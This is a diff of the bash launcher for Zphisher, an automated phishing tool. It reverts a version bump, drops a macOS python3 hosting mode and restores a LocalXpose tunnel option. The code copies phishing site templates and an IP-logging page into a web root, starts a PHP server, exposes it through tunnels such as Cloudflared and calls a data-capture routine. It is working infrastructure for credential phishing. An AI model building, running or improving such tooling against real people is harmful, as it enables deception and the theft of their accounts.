@@ -1,8 +1,8 @@
 #!/bin/bash
 
 ##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT / Steven Debruyn
-##   Version 	: 	3.1
+##   Author 	: 	TAHMID RAYAT 
+##   Version 	: 	3.0
 ##   Github 	: 	https://github.com/htr-tech/zphisher
 
 
@@ -90,7 +90,7 @@
 ##   TheLinuxChoice - https://twitter.com/linux_choice
 
 
-__version__="3.1"
+__version__="3.0"
 
 ## DEFAULT HOST & PORT
 HOST='127.0.0.1'
@@ -237,8 +237,7 @@ dependencies() {
 					sudo yum -y install "$pkg"
 				else
 					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
-	## do not exit with error if php is not installed
- ## { reset_color; exit 1; }
+					{ reset_color; exit 1; }
 				fi
 			}
 		done
@@ -380,18 +379,7 @@ setup_site() {
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
- 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
-}
-
-## Setup website and start Python3 server on MacOS
-setup_site_mac() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
-	cp -rf .sites/"$website"/* .server/www
-	cp -f .sites/ip.php .server/www/
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
-## 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
-## Instead of php use python3, this should make it work natively on MacOS
- 	cd .server/www && python3 -m http.server "$PORT" > /dev/null 2>&1 &
+	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
 ## Get IP address
@@ -508,16 +496,6 @@ start_localhost() {
 	capture_data
 }
 
-## Start macos
-start_macos() {
-	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	setup_site_mac
-	{ sleep 1; clear; banner_small; }
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
-	capture_data
-}
-
 ## Tunnel selection
 tunnel_menu() {
 	{ clear; banner_small; }
@@ -525,7 +503,7 @@ tunnel_menu() {
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
 		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
-		${RED}[${WHITE}03${RED}]${ORANGE} Localhost_MacOS   ${RED}[${CYAN}NEW!${RED}]
+		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
 
 	EOF
 
@@ -537,7 +515,7 @@ tunnel_menu() {
 		2 | 02)
 			start_cloudflared;;
 		3 | 03)
-			start_macos;;
+			start_loclx;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
